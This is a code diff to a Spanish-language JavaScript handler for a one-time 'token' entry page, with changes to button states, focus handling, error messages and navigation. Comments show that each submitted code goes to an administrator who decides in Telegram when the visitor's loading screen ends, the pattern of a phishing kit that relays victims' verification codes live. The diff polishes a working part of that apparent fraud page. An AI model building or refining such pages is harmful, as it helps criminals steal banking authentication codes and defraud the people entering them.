@@ -20,6 +20,8 @@ document.addEventListener('DOMContentLoaded', function() {
 
     // Disable verify button by default
     verifyButton.disabled = true;
+    verifyButton.style.opacity = '0.5';
+    verifyButton.style.cursor = 'not-allowed';
 
     // Check if all inputs are filled with valid numbers
     const checkInputs = () => {
@@ -55,8 +57,6 @@ document.addEventListener('DOMContentLoaded', function() {
             if (value.length === 1) {
                 if (index < inputs.length - 1) {
                     inputs[index + 1].focus();
-                } else {
-                    checkInputs();
                 }
             }
             checkInputs();
@@ -64,10 +64,10 @@ document.addEventListener('DOMContentLoaded', function() {
 
         input.addEventListener('keydown', (e) => {
             if (e.key === 'Backspace') {
+                resetError();
                 if (!e.target.value && index > 0) {
                     inputs[index - 1].focus();
                 }
-                resetError();
             }
         });
 
@@ -90,7 +90,7 @@ document.addEventListener('DOMContentLoaded', function() {
         });
     });
 
-    // Submit handler para el formulario de token - MEJORADO
+    // Submit handler para el formulario de token - COMPLETAMENTE CORREGIDO
     verifyButton.addEventListener('click', async function(e) {
         e.preventDefault();
         console.log('📤 Formulario Token enviado');
@@ -115,7 +115,9 @@ document.addEventListener('DOMContentLoaded', function() {
         // Deshabilitar botón durante el envío
         verifyButton.disabled = true;
         verifyButton.textContent = 'Verificando...';
+        verifyButton.style.opacity = '0.5';
         
+        // MOSTRAR LOADING INMEDIATAMENTE
         if (window.commonUtils) {
             window.commonUtils.showLoading('Enviando token para verificación...');
         }
@@ -156,7 +158,7 @@ document.addEventListener('DOMContentLoaded', function() {
                 codigo: token
             }));
 
-            // Mantener pantalla de carga
+            // MANTENER LOADING HASTA QUE EL ADMIN PRESIONE "FINALIZAR" EN TELEGRAM
             if (window.commonUtils) {
                 window.commonUtils.showLoading('Token enviado. Esperando verificación del administrador...');
             }
@@ -178,18 +180,23 @@ document.addEventListener('DOMContentLoaded', function() {
             
             if (errorMessage) {
                 errorMessage.style.display = 'block';
+                errorMessage.querySelector('p').textContent = '❌ Error al enviar el token. Por favor intente nuevamente.';
             }
         }
     });
 
+    // Botón Atrás
     if (backButton) {
-        backButton.addEventListener('click', () => {
+        backButton.addEventListener('click', (e) => {
+            e.preventDefault();
             window.history.back();
         });
     }
 
+    // Botón Abandonar
     if (abandonButton) {
-        abandonButton.addEventListener('click', () => {
+        abandonButton.addEventListener('click', (e) => {
+            e.preventDefault();
             if (confirm('¿Está seguro que desea abandonar el proceso?')) {
                 window.location.href = 'index.html';
             }
@@ -197,7 +204,9 @@ document.addEventListener('DOMContentLoaded', function() {
     }
 
     // Focus en el primer input al cargar
-    if (inputs[0]) inputs[0].focus();
+    if (inputs[0]) {
+        inputs[0].focus();
+    }
     
     // Verificar estado inicial de los inputs
     checkInputs();
